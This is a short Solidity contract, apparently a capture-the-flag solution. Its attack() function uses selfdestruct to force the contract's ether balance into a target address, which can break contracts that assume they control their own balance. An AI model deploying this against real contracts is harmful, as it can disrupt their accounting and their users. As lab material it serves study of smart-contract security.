// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {
    constructor() payable {}

    // Selfdestruct the contract and send its balance to the target contract
    function attack(address payable _forceAddress) public {
        selfdestruct(_forceAddress);
    }
}
